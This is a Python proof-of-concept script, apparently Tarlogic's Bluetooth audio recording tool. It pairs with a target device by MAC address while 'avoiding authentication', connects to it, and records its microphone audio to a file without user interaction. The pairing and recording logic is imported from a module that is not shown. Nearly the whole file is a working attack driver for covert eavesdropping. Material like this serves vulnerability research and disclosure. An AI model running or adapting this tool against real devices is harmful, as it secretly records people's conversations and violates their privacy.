#!/usr/bin/env python3

import argparse
from interface import bcolors, color_print, log_info, log_warn, input_yn
from core import connect, BluezTarget, BluezAddressType, pair, record, playback
import time

def main():
    # Cool banner...
    color_print(bcolors.HEADER, "░█▀▄░█░░░█░█░█▀▀░█▀▀░█▀█░█░█░")
    color_print(bcolors.HEADER, "░█▀▄░█░░░█░█░█▀▀░▀▀█░█▀▀░░█░░")
    color_print(bcolors.HEADER, "░▀▀░░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀░░░░▀░░")
    color_print(bcolors.HEADER, "░▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀░")
    print(f"Bluetooth audio recording tool by {bcolors.HEADER}Tarlogic{bcolors.ENDC}")

    # Parse command line arguments...
    parser = argparse.ArgumentParser(
        prog="No interaction recording",
        description="Try to pair to a device, connect to it and record sound without user interaction",
    )
    parser.add_argument(
        "-a",
        "--target-address",
        help="Target device MAC address",
        required=True,
        dest="address",
    )
    parser.add_argument(
        "-t",
        "--target-address-type",
        help="Target device MAC address type",
        dest="address_type",
        type=lambda t: BluezAddressType[t],
        choices=list(BluezAddressType),
        default=BluezAddressType.BR_EDR,
    )
    parser.add_argument(
        "-f",
        "--file",
        help="File to store recorded audio",
        dest="outfile",
        default="recording.wav",
    )
    parser.add_argument(
        "-s",
        "--sink",
        help="Sink to play the audio back",
        dest="sink",
        default="alsa_output.pci-0000_00_05.0.analog-stereo",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        help="Show verbose output",
        dest="verbose",
        default=False,
        action='store_true'
    )
    args = parser.parse_args()

    # Convert args to target
    target = BluezTarget(args.address, args.address_type)

    # Run the PoC!
    log_info(f"Avoiding authentication with {args.address}...")
    log_info(f"Generating shared key...")
    pair(target, verbose=args.verbose)

    log_warn(f"Key generated")
    log_info(f"Establishing connection...")
    time.sleep(1)
    connect(target, verbose=args.verbose)

    log_info(f"Starting audio recording...")
    log_warn(f"Recording!")
    time.sleep(1)
    record(target, outfile=args.outfile, verbose=args.verbose)

    log_warn(f"Recording stored in \"{args.outfile}\"")
    play_back = input_yn("Play audio back?")
    if play_back:
        playback(args.sink, args.outfile, verbose=args.verbose)
    log_info(f"Exiting")


if __name__ == "__main__":
    main()
